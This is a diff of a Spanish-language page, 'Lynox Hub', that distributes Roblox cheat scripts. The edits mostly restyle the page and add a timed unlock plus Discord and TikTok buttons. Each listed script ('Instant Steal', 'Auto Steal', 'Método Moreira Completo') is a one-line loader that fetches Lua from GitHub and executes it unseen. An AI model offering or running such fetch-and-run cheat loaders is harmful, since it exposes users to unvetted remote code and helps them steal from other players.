@@ -29,10 +29,9 @@ p {
 }
 
 button {
-    background: #5865F2;
     color: white;
     border: none;
-    padding: 16px 32px;
+    padding: 16px 30px;
     font-size: 18px;
     border-radius: 10px;
     cursor: pointer;
@@ -44,6 +43,18 @@ button:hover {
     opacity: 0.9;
 }
 
+.unlock {
+    background: #00aa66;
+}
+
+.discord {
+    background: #5865F2;
+}
+
+.tiktok {
+    background: #ff0050;
+}
+
 #countdown {
     margin-top: 15px;
     font-size: 16px;
@@ -53,6 +64,13 @@ button:hover {
 .scripts {
     display: none;
     margin-top: 40px;
+}
+
+.socials {
+    display: none;
+    margin-top: 25px;
+    gap: 15px;
+    justify-content: center;
 }
 
 .script {
@@ -67,6 +85,12 @@ button:hover {
 .script h3 {
     margin: 0 0 8px;
     color: #00ffaa;
+}
+
+.script-note {
+    color: #ffaa00;
+    font-size: 14px;
+    margin: 5px 0 10px;
 }
 
 textarea {
@@ -98,12 +122,28 @@ textarea {
 
 <div class="container">
     <h1>🔥 LYNOX HUB – SCRIPTS 🔥</h1>
-    <p>Para ver los scripts debes unirte a nuestro Discord</p>
+    <p>Haz clic para desbloquear los scripts</p>
 
-    <button onclick="unlock()">🔗 Unirse al Discord</button>
+    <!-- BOTÓN DESBLOQUEO -->
+    <button class="unlock" onclick="unlock()">🔓 Desbloquear Scripts</button>
     <div id="countdown"></div>
 
+    <!-- BOTONES DISCORD Y TIKTOK (DESPUÉS) -->
+    <div class="socials" id="socials">
+        <button class="discord" onclick="openDiscord()">💬 Discord</button>
+        <button class="tiktok" onclick="openTikTok()">🎵 TikTok</button>
+    </div>
+
     <div class="scripts" id="scripts">
+
+        <div class="script">
+            <h3>Método Moreira Completo</h3>
+            <p class="script-note">
+                ⚠️ Nota: Solo funciona con Brairots arriba de <b>50M</b> en tu base
+            </p>
+            <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/lynox-67/metodo-moreira/refs/heads/main/lua"))()</textarea>
+            <button class="copy" onclick="copy(this)">📋 Copiar</button>
+        </div>
 
         <div class="script">
             <h3>Instant Steal</h3>
@@ -130,12 +170,6 @@ textarea {
         </div>
 
         <div class="script">
-            <h3>Método Moreira</h3>
-            <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/lynox-67/metodo-moreira/refs/heads/main/lua"))()</textarea>
-            <button class="copy" onclick="copy(this)">📋 Copiar</button>
-        </div>
-
-        <div class="script">
             <h3>Auto Steal</h3>
             <textarea readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/lynox-67/autosteal/refs/heads/main/lua"))()</textarea>
             <button class="copy" onclick="copy(this)">📋 Copiar</button>
@@ -156,21 +190,18 @@ textarea {
     </div>
 
     <div class="footer">
-        © Lynox Hub | Discord exclusivo
+        © Lynox Hub | Discord & TikTok
     </div>
 </div>
 
 <script>
 let time = 15;
-let timer;
 
 function unlock() {
-    window.open("https://discord.gg/3KWj8TJp", "_blank");
-
     document.getElementById("countdown").innerText =
         "⏳ Espera " + time + " segundos...";
 
-    timer = setInterval(() => {
+    const timer = setInterval(() => {
         time--;
         document.getElementById("countdown").innerText =
             "⏳ Espera " + time + " segundos...";
@@ -178,10 +209,19 @@ function unlock() {
         if (time <= 0) {
             clearInterval(timer);
             document.getElementById("scripts").style.display = "block";
+            document.getElementById("socials").style.display = "flex";
             document.getElementById("countdown").innerText =
                 "✅ Scripts desbloqueados";
         }
     }, 1000);
+}
+
+function openDiscord() {
+    window.open("https://discord.gg/3KWj8TJp", "_blank");
+}
+
+function openTikTok() {
+    window.open("https://www.tiktok.com/@lynox.exd?is_from_webapp=1&sender_device=pc", "_blank");
 }
 
 function copy(btn) {
